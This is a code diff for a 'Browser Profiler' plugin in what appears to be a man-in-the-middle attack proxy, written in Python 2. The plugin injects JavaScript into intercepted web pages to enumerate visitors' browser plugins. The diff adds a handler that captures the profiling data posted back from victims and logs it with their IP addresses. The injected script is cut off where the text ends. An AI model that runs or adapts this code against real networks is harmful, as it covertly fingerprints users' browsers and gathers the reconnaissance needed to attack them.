@@ -1,16 +1,32 @@
 from plugins.plugin import Plugin
 from plugins.Inject import Inject
+from pprint import pformat
+import logging
 
 class BrowserProfiler(Inject, Plugin):
     name = "Browser Profiler"
     optname = "browserprofiler"
     desc = "Attempts to enumerate all browser plugins of connected clients"
+    implements = ["handleResponse","handleHeader","connectionMade", "sendPostData"]
     has_opts = False
 
     def initialize(self,options):
         Inject.initialize(self, options)
         self.html_payload = self.get_payload()
-        print "[*] %s online" % self.name
+        print "[*] Browser Profiler online"
+
+    def post2dict(self, string):
+        dict = {}
+        for line in string.split('&'):
+            t = line.split('=')
+            dict[t[0]] = t[1]
+        return dict
+
+    def sendPostData(self, request):
+        #Handle the browserprofiler plugin output
+        if 'clientprfl' in request.uri:
+            out = pformat(self.post2dict(request.postData))
+            logging.warning("%s Browser Profilerer data:\n%s" % (request.client.getClientIP(), out))
 
     def get_payload(self):
         payload = """<script type="text/javascript">
